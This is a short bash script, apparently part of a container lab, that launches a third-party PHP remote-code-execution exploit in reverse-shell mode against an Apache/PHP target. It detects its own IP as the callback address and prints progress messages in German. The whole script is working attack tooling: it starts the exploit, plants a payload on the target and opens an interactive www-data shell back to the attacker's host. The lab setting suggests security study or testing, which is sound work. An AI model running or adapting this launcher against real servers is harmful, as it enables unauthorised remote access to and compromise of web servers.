#!/usr/bin/env bash
# Interactive reverse shell via Zer061 exploit.py (--revshell), listener in this container.
set -euo pipefail
EXPLOIT="/opt/third_party/zer061-php2shell/exploit.py"
OFFSETS="/opt/third_party/zer061-php2shell/out/offsets.env"
URL="${ZER061_URL:-http://target-apache/index.php}"
PORT="${ZER061_LPORT:-4444}"
RETRIES="${ZER061_RETRIES:-12}"

if [[ ! -f "$EXPLOIT" ]]; then
  echo "FEHLER: $EXPLOIT fehlt (fetch-zer061 auf dem Host)" >&2
  exit 1
fi

MY_IP="$(ip -4 route get "$(getent ahostsv4 target-apache 2>/dev/null | awk '{print $1; exit}')" 2>/dev/null \
  | awk '{for (i = 1; i <= NF; i++) if ($i == "src") { print $(i + 1); exit }}')"
if [[ -z "$MY_IP" ]]; then
  MY_IP="$(ip -4 addr show scope global 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)"
fi
if [[ -z "$MY_IP" ]]; then
  echo "FEHLER: Konnte keine Container-IP im Lab-Netz ermitteln" >&2
  exit 1
fi

echo "[zer061-revshell] Target: $URL"
echo "[zer061-revshell] Callback: ${MY_IP}:${PORT} (Apache → dieser Container)"
echo "[zer061-revshell] Payload: out/c auf Target (/out/c), Trigger: sh</out/c"
echo "[zer061-revshell] Nach Verbindung: www-data-Shell. Beenden: Ctrl-C"
echo

extra=(--profile bookworm --retries "$RETRIES" --revshell "${MY_IP}:${PORT}")
if [[ -f "$OFFSETS" ]]; then
  extra+=(--offsets-file "$OFFSETS")
fi

exec python3 "$EXPLOIT" -u "$URL" "${extra[@]}"
